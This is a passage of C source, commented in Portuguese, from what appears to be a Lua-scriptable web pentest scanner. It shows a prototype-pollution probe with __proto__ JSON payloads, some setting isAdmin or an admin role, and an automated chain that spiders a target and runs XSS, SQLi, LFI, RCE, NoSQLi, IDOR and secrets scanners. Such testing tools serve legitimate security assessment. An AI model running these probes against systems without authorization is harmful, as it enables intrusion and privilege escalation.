        curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
        curl_easy_setopt(ch,CURLOPT_USERAGENT,"Mozilla/5.0");
        curl_easy_perform(ch);
        long code=0; curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&code);
        curl_easy_cleanup(ch);

        if(wb.buf&&wb.len>0) {
            /* Detecta pollution: marcador refletido, diff, erro 500 */
            int has_marker=memmem(wb.buf,wb.len,"pp_marker",9)!=NULL;
            long diff=(long)wb.len-(long)strlen(body_base);
            int status_diff=(code!=code_base&&(code==500||code==400||code==422));
            int sig_error=memmem(wb.buf,wb.len,"TypeError",9)!=NULL||
                          memmem(wb.buf,wb.len,"Cannot read propert",19)!=NULL||
                          memmem(wb.buf,wb.len,"__proto__",9)!=NULL;

            if(has_marker||status_diff||sig_error) {
                printf("\033[1;31m  [✓ PROTO/%s] HTTP %ld  diff=%+ld\033[0m\n",
                       get_tests[i].desc,code,diff);
                char ev[256]; snprintf(ev,255,"GET poll=%s status=%ld marker=%d err=%d",
                    get_tests[i].suffix,code,has_marker,sig_error);
                vuln_register("ProtoPollution",base,get_tests[i].suffix,ev,has_marker?3:2,has_marker?90:60);
                found_register(get_tests[i].desc);
                found++;
            } else {
                printf("\033[0;90m  [✗] %-30s HTTP %ld\033[0m\n",get_tests[i].desc,code);
            }
        }
        free(wb.buf);
    }

    printf("\n\033[1;36m[FASE 2] POST — JSON body __proto__ injection\033[0m\n");

    /* JSON payloads para POST */
    const char *json_tests[] = {
        "{\"__proto__\":{\"pp\":\"polluted\"}}",
        "{\"constructor\":{\"prototype\":{\"pp\":\"polluted\"}}}",
        "{\"__proto__\":{\"toString\":\"pp_marker\"}}",
        "{\"__proto__\":{\"hasOwnProperty\":\"pp_marker\"}}",
        "{\"__proto__\":{\"isAdmin\":true}}",
        "{\"__proto__\":{\"role\":\"admin\"}}",
        "{\"__proto__\":{\"debug\":true}}",
        "{\"a\":1,\"__proto__\":{\"b\":2}}",
        NULL
    };
    const char *json_descs[] = {
        "__proto__.pp","constructor.proto.pp","__proto__.toString",
        "__proto__.hasOwnProperty","__proto__.isAdmin","__proto__.role",
        "__proto__.debug","nested __proto__",NULL
    };

    /* Baseline POST */
    long code_post_base=0;
    char body_post_base[65536]={0};
    {CURL *ch=curl_easy_init();if(ch){WorkBuf wb={0};wb.buf=malloc(65536);wb.cap=65536;
        curl_easy_setopt(ch,CURLOPT_URL,base);curl_easy_setopt(ch,CURLOPT_POST,1L);
        curl_easy_setopt(ch,CURLOPT_POSTFIELDS,"{\"test\":\"normal\"}");
        struct curl_slist *hdrs=curl_slist_append(NULL,"Content-Type: application/json");
        curl_easy_setopt(ch,CURLOPT_HTTPHEADER,hdrs);
        curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,worker_write_cb);curl_easy_setopt(ch,CURLOPT_WRITEDATA,&wb);
        curl_easy_setopt(ch,CURLOPT_TIMEOUT,8L);curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
        curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);curl_easy_setopt(ch,CURLOPT_USERAGENT,"Mozilla/5.0");
        curl_easy_perform(ch);curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&code_post_base);
        if(wb.buf&&wb.len>0&&wb.len<65535)memcpy(body_post_base,wb.buf,wb.len);
        curl_slist_free_all(hdrs);curl_easy_cleanup(ch);free(wb.buf);}}

    for(int i=0; json_tests[i]; i++) {
        CURL *ch=curl_easy_init(); if(!ch) continue;
        WorkBuf wb={0}; wb.buf=malloc(65536); wb.cap=65536;
        struct curl_slist *hdrs=curl_slist_append(NULL,"Content-Type: application/json");
        curl_easy_setopt(ch,CURLOPT_URL,base);
        curl_easy_setopt(ch,CURLOPT_POST,1L);
        curl_easy_setopt(ch,CURLOPT_POSTFIELDS,json_tests[i]);
        curl_easy_setopt(ch,CURLOPT_HTTPHEADER,hdrs);
        curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,worker_write_cb);
        curl_easy_setopt(ch,CURLOPT_WRITEDATA,&wb);
        curl_easy_setopt(ch,CURLOPT_TIMEOUT,8L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
        curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
        curl_easy_setopt(ch,CURLOPT_USERAGENT,"Mozilla/5.0");
        curl_easy_perform(ch);
        long code=0; curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&code);
        curl_slist_free_all(hdrs); curl_easy_cleanup(ch);

        if(wb.buf&&wb.len>0) {
            int has_marker=memmem(wb.buf,wb.len,"polluted",8)!=NULL||
                           memmem(wb.buf,wb.len,"pp_marker",9)!=NULL;
            int sig_error=memmem(wb.buf,wb.len,"TypeError",9)!=NULL||
                          memmem(wb.buf,wb.len,"SyntaxError",11)!=NULL||
                          memmem(wb.buf,wb.len,"__proto__",9)!=NULL;
            long diff=(long)wb.len-(long)strlen(body_post_base);
            int status_diff=(code!=code_post_base&&(code==500||code==400||code==422));
            int bool_diff=labs(diff)>50;

            if(has_marker||sig_error||(status_diff&&bool_diff)) {
                printf("\033[1;31m  [✓ PROTO/POST/%s] HTTP %ld  diff=%+ld\033[0m\n",
                       json_descs[i],code,diff);
                char ev[256]; snprintf(ev,255,"POST body=%s status=%ld diff=%+ld",
                    json_descs[i],code,diff);
                vuln_register("ProtoPollution",base,json_tests[i],ev,has_marker?3:2,has_marker?90:65);
                found_register(json_descs[i]);
                found++;
            } else {
                printf("\033[0;90m  [✗] POST %-28s HTTP %ld\033[0m\n",json_descs[i],code);
            }
        }
        free(wb.buf);
    }

    printf("\n\033[1m┌─────────────────────────────────────────────┐\033[0m\n");
    printf("\033[1m│  Prototype Pollution                        │\033[0m\n");
    printf("\033[1m│  Target: %-35.35s│\033[0m\n", base);
    if(found>0)
        printf("\033[1;31m│  ❌ VULNERÁVEL — %d hit(s)%-18s│\033[0m\n",found,"");
    else
        printf("\033[1;32m│  ✅ Sem prototype pollution detectado       │\033[0m\n");
    printf("\033[0;90m│  Confirme com: DevTools → prototype chain   │\033[0m\n");
    printf("\033[1m└─────────────────────────────────────────────┘\033[0m\n\n");

    lua_pushinteger(L,found); return 1;
}

// ============================================================================
// MOD.CHAIN — Pipeline automático: spider → classificação → scanner certo
// mod.chain(url [, opts])
// opts = { pages=30, xss=true, sqli=true, lfi=true, rce=true, headers=true,
//           api=true, auth=true, params=true, backup=true, secrets=true }
// ============================================================================
static int l_mod_chain(lua_State *L) {
    const char *raw_url = luaL_checkstring(L, 1);
    char url_buf[1024]={0};
    const char *url = normalize_url(raw_url, url_buf, sizeof(url_buf));

    /* Opções — defaults: tudo ativo */
    int opt_pages   = 30;
    int opt_xss     = 1, opt_sqli  = 1, opt_lfi    = 1;
    int opt_rce     = 1, opt_csrf  = 1, opt_headers = 1;
    int opt_params  = 1, opt_api   = 1, opt_auth    = 1;
    int opt_backup  = 1, opt_secrets= 1, opt_idor   = 1;
    int opt_nosql   = 1, opt_crlf  = 1;

    if(lua_gettop(L)>=2 && lua_istable(L,2)){
        #define BOPT(name,var) lua_getfield(L,2,name); if(lua_isboolean(L,-1)) var=lua_toboolean(L,-1); lua_pop(L,1)
        #define NOPT(name,var) lua_getfield(L,2,name); if(lua_isnumber(L,-1))  var=(int)lua_tointeger(L,-1); lua_pop(L,1)
        NOPT("pages",   opt_pages);
        BOPT("xss",     opt_xss);   BOPT("sqli",    opt_sqli);
        BOPT("lfi",     opt_lfi);   BOPT("rce",     opt_rce);
        BOPT("csrf",    opt_csrf);  BOPT("headers",  opt_headers);
        BOPT("params",  opt_params);BOPT("api",     opt_api);
        BOPT("auth",    opt_auth);  BOPT("backup",   opt_backup);
        BOPT("secrets", opt_secrets);BOPT("idor",   opt_idor);
        BOPT("nosql",   opt_nosql); BOPT("crlf",    opt_crlf);
        #undef BOPT
        #undef NOPT
    }

    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║  mod.chain — Pipeline de Pentest Automático                  ║\033[0m\n");
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Alvo  : %s\033[0m\n", url);
    printf("\033[1;33m[*] Páginas: %d\033[0m\n\n", opt_pages);

    /* ── FASE 1: Spider ───────────────────────────────────────────────── */
    printf("\033[1;36m━━━ FASE 1: Spider ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n");

    int n_targets=0;
    char **targets = collect_scan_targets(url, &n_targets);

    /* Também roda l_mod_spider para ter a classificação completa */
    lua_getglobal(L,"mod");
    lua_getfield(L,-1,"spider");
    lua_pushstring(L,url);
    lua_pushinteger(L,opt_pages);
    lua_call(L,2,1);  /* result = mod.spider(url, pages) */

    /* Extrai categorias do result */
    int n_params=0, n_api=0, n_auth=0, n_redirect=0, n_inputs=0, n_idor=0, n_sensitive=0;
    char *cat_params[SP_MAX_BUCKET]={0};
    char *cat_api[SP_MAX_BUCKET]={0};
    char *cat_auth[SP_MAX_BUCKET]={0};
    char *cat_redirect[SP_MAX_BUCKET]={0};
    char *cat_inputs[SP_MAX_BUCKET]={0};
    char *cat_idor[SP_MAX_BUCKET]={0};
    char *cat_sensitive[SP_MAX_BUCKET]={0};

    if(lua_istable(L,-1)){
        const char *cats[]  = {"params","api","auth","redirect","inputs","idor","sensitive",NULL};
        /* Ponteiros diretos para cada array de categorias */
        char **arrs[8];
        arrs[0]=cat_params; arrs[1]=cat_api;    arrs[2]=cat_auth;
        arrs[3]=cat_redirect; arrs[4]=cat_inputs; arrs[5]=cat_idor;
        arrs[6]=cat_sensitive; arrs[7]=NULL;
        int *counts[] = {&n_params,&n_api,&n_auth,&n_redirect,&n_inputs,&n_idor,&n_sensitive,NULL};
        for(int ci=0; cats[ci]; ci++){
            lua_getfield(L,-1,cats[ci]);
            if(lua_istable(L,-1)){
                int len=(int)lua_rawlen(L,-1);
                for(int k=1;k<=len && *counts[ci]<SP_MAX_BUCKET;k++){
                    lua_rawgeti(L,-1,k);
                    if(lua_isstring(L,-1))
                        arrs[ci][(*counts[ci])++]=(char*)lua_tostring(L,-1);
                    lua_pop(L,1);
                }
            }
            lua_pop(L,1);
        }
    }
    lua_pop(L,2); /* pop result + mod */

    /* Totais */
    int total_endpoints = n_params + n_inputs;
    int total_all = n_params + n_api + n_auth + n_redirect + n_inputs + n_idor + n_sensitive;
    printf("\n\033[1;32m[✓] Spider: %d endpoints | %d com parâmetros | %d APIs | %d auth | %d inputs\033[0m\n\n",
           total_all, n_params, n_api, n_auth, n_inputs);

    if(total_all == 0){
        printf("\033[0;33m[!] Spider não encontrou endpoints. Testando URL base.\033[0m\n\n");
        /* Fallback: usa targets do collect_scan_targets */
    }

    /* Totais de vulnerabilidades por categoria */
    int chain_xss=0, chain_sqli=0, chain_lfi=0, chain_rce=0;
    int chain_csrf=0, chain_headers=0, chain_params_found=0;
    int chain_backup=0, chain_secrets=0, chain_idor=0;
    int chain_nosql=0, chain_crlf=0;

    /* Helper: chama mod.X(url) via Lua stack */
    #define CHAIN_CALL(modname, counter) do { \
        lua_getglobal(L,"mod"); \
        lua_getfield(L,-1,modname); \
        if(lua_isfunction(L,-1)){ \
            lua_pushstring(L,_ep); \
            if(lua_pcall(L,1,1,0)==LUA_OK){ \
                int _r=lua_tointeger(L,-1); \
                if(_r>0){counter+=_r;} \
            } \
            lua_pop(L,1); \
        } else lua_pop(L,1); \
        lua_pop(L,1); \
    } while(0)

    /* ── FASE 2: Endpoints com parâmetros → XSS + SQLi + LFI + RCE ── */
    if((n_params>0 || (n_targets>0 && total_all==0)) &&
       (opt_xss||opt_sqli||opt_lfi||opt_rce||opt_nosql||opt_crlf)){
        printf("\033[1;36m━━━ FASE 2: Scanners em Parâmetros (%d endpoints) ━━━━━━━━━━━━━\033[0m\n",
               n_params>0?n_params:n_targets);

        /* Usa params do spider OU targets do collect_scan_targets */
        char **ep_list = n_params>0 ? cat_params : targets;
        int    ep_n    = n_params>0 ? n_params   : n_targets;

        for(int i=0;i<ep_n;i++){
            const char *_ep = ep_list[i];
            printf("\n\033[0;90m  [%d/%d] %s\033[0m\n",i+1,ep_n,_ep);
            if(opt_xss)   CHAIN_CALL("xss",   chain_xss);
            if(opt_sqli)  CHAIN_CALL("sqli",  chain_sqli);
            if(opt_lfi)   CHAIN_CALL("lfi",   chain_lfi);
            if(opt_rce)   CHAIN_CALL("rce",   chain_rce);
            if(opt_nosql) CHAIN_CALL("nosql", chain_nosql);
            if(opt_crlf)  CHAIN_CALL("crlf",  chain_crlf);
        }
    }

    /* ── FASE 3: Input endpoints → XSS + SQLi + RCE (forms sem ? na URL) */
    if(n_inputs>0 && (opt_xss||opt_sqli||opt_rce)){
        printf("\n\033[1;36m━━━ FASE 3: Input Endpoints / Forms (%d) ━━━━━━━━━━━━━━━━━━━\033[0m\n",n_inputs);
        for(int i=0;i<n_inputs;i++){
            /* Extrai só a URL do "URL [METHOD] inputs:campos" */
            char ep_url[512]={0};
            const char *sp=cat_inputs[i];
            const char *bk=strstr(sp," [");
            if(bk){size_t l=(size_t)(bk-sp);if(l<512){memcpy(ep_url,sp,l);ep_url[l]='\0';}}
            else snprintf(ep_url,511,"%s",sp);
            const char *_ep=ep_url;
            printf("\n\033[0;90m  [%d/%d] %s\033[0m\n",i+1,n_inputs,cat_inputs[i]);
            if(opt_xss)  CHAIN_CALL("xss",  chain_xss);
            if(opt_sqli) CHAIN_CALL("sqli", chain_sqli);
            if(opt_rce)  CHAIN_CALL("rce",  chain_rce);
        }
    }

    /* ── FASE 4: APIs → params discovery + nosql ──────────────────── */
    if(n_api>0 && (opt_api||opt_params||opt_nosql)){
        printf("\n\033[1;36m━━━ FASE 4: APIs (%d endpoints) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n",n_api);
        for(int i=0;i<n_api;i++){
            const char *_ep=cat_api[i];
            printf("\n\033[0;90m  [%d/%d] %s\033[0m\n",i+1,n_api,_ep);
            if(opt_params){
                lua_getglobal(L,"mod"); lua_getfield(L,-1,"params");
                if(lua_isfunction(L,-1)){
                    lua_pushstring(L,_ep);
                    if(lua_pcall(L,1,3,0)==LUA_OK){
                        chain_params_found+=lua_tointeger(L,-3);
                    }
                    lua_pop(L,3);
                } else lua_pop(L,1);
                lua_pop(L,1);
            }
            if(opt_nosql) CHAIN_CALL("nosql",chain_nosql);
        }
    }

    /* ── FASE 5: Auth endpoints → SQLi (bypass) + CSRF ─────────────── */
    if(n_auth>0 && (opt_auth||opt_csrf||opt_sqli)){
        printf("\n\033[1;36m━━━ FASE 5: Auth Endpoints (%d) ━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n",n_auth);
        for(int i=0;i<n_auth;i++){
            const char *_ep=cat_auth[i];
            printf("\n\033[0;90m  [%d/%d] %s\033[0m\n",i+1,n_auth,_ep);
            if(opt_sqli) CHAIN_CALL("sqli",chain_sqli);
            if(opt_csrf) CHAIN_CALL("csrf",chain_csrf);
        }
    }

    /* ── FASE 6: IDOR candidates ─────────────────────────────────────── */
    if(n_idor>0 && opt_idor){
        printf("\n\033[1;36m━━━ FASE 6: IDOR Candidates (%d) ━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n",n_idor);
        for(int i=0;i<n_idor;i++){
            const char *_ep=cat_idor[i];
            printf("\n\033[0;90m  [%d/%d] %s\033[0m\n",i+1,n_idor,_ep);
            CHAIN_CALL("idor",chain_idor);
        }
    }

    /* ── FASE 7: Sensitive paths → git + secrets + backup ──────────── */
    if(n_sensitive>0 && (opt_backup||opt_secrets)){
        printf("\n\033[1;36m━━━ FASE 7: Paths Sensíveis (%d) ━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n",n_sensitive);
        for(int i=0;i<n_sensitive;i++){
            const char *_ep=cat_sensitive[i];
            printf("\n\033[0;90m  [%d/%d] %s\033[0m\n",i+1,n_sensitive,_ep);
            if(opt_secrets) CHAIN_CALL("secrets",chain_secrets);
            if(opt_backup)  CHAIN_CALL("backup", chain_backup);
        }
    }

    /* ── FASE 8: Headers analysis na URL base ────────────────────────── */
    if(opt_headers){
        printf("\n\033[1;36m━━━ FASE 8: Security Headers ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n\n");
        const char *_ep=url;
        CHAIN_CALL("headers",chain_headers);
    }
    #undef CHAIN_CALL

    if(targets) free_scan_targets(targets,n_targets);

    /* ── Relatório Final ─────────────────────────────────────────────── */
    int total_vulns = chain_xss+chain_sqli+chain_lfi+chain_rce+
                      chain_csrf+chain_headers+chain_idor+
                      chain_backup+chain_secrets+chain_nosql+chain_crlf;

    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║  RELATÓRIO CHAIN                                             ║\033[0m\n");
    printf("\033[1;35m╠══════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;35m║\033[0m  Endpoints escaneados : %-3d                                  \033[1;35m║\033[0m\n",
           total_endpoints + n_api + n_auth + n_idor + n_sensitive);
    if(chain_xss>0)    printf("\033[1;35m║\033[0m  \033[1;31m✗ XSS           : %d vuln(s)\033[0m                               \033[1;35m║\033[0m\n",chain_xss);
    if(chain_sqli>0)   printf("\033[1;35m║\033[0m  \033[1;31m✗ SQLi          : %d vuln(s)\033[0m                               \033[1;35m║\033[0m\n",chain_sqli);
    if(chain_rce>0)    printf("\033[1;35m║\033[0m  \033[1;31m✗ RCE           : %d vuln(s)\033[0m                               \033[1;35m║\033[0m\n",chain_rce);
    if(chain_lfi>0)    printf("\033[1;35m║\033[0m  \033[1;31m✗ LFI           : %d vuln(s)\033[0m                               \033[1;35m║\033[0m\n",chain_lfi);
    if(chain_nosql>0)  printf("\033[1;35m║\033[0m  \033[1;31m✗ NoSQLi        : %d vuln(s)\033[0m                               \033[1;35m║\033[0m\n",chain_nosql);
    if(chain_csrf>0)   printf("\033[1;35m║\033[0m  \033[1;31m✗ CSRF          : %d vuln(s)\033[0m                               \033[1;35m║\033[0m\n",chain_csrf);
    if(chain_idor>0)   printf("\033[1;35m║\033[0m  \033[1;31m✗ IDOR          : %d vuln(s)\033[0m                               \033[1;35m║\033[0m\n",chain_idor);
    if(chain_crlf>0)   printf("\033[1;35m║\033[0m  \033[1;31m✗ CRLF          : %d vuln(s)\033[0m                               \033[1;35m║\033[0m\n",chain_crlf);
    if(chain_headers>0)printf("\033[1;35m║\033[0m  \033[1;33m⚠ Headers       : %d issue(s)\033[0m                              \033[1;35m║\033[0m\n",chain_headers);
    if(chain_secrets>0)printf("\033[1;35m║\033[0m  \033[1;31m✗ Secrets       : %d exposto(s)\033[0m                            \033[1;35m║\033[0m\n",chain_secrets);
    if(chain_backup>0) printf("\033[1;35m║\033[0m  \033[1;31m✗ Backup files  : %d encontrado(s)\033[0m                         \033[1;35m║\033[0m\n",chain_backup);
    printf("\033[1;35m╠══════════════════════════════════════════════════════════════╣\033[0m\n");
    if(total_vulns==0)
        printf("\033[1;35m║\033[0m  \033[1;32m✓ Nenhuma vulnerabilidade crítica detectada\033[0m                  \033[1;35m║\033[0m\n");
    else
        printf("\033[1;35m║\033[0m  \033[1;31m☠ TOTAL: %d vulnerabilidade(s)\033[0m                              \033[1;35m║\033[0m\n",total_vulns);
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");

    /* Log se houver vulns */
    if(total_vulns>0){
        char detail[128]={0};
        snprintf(detail,sizeof(detail),"total=%d xss=%d sqli=%d rce=%d lfi=%d",
                 total_vulns,chain_xss,chain_sqli,chain_rce,chain_lfi);
        elliot_log("CHAIN",url,detail);
    }

    lua_pushinteger(L,total_vulns);
    return 1;
}

static int l_mod_help(lua_State *L) {
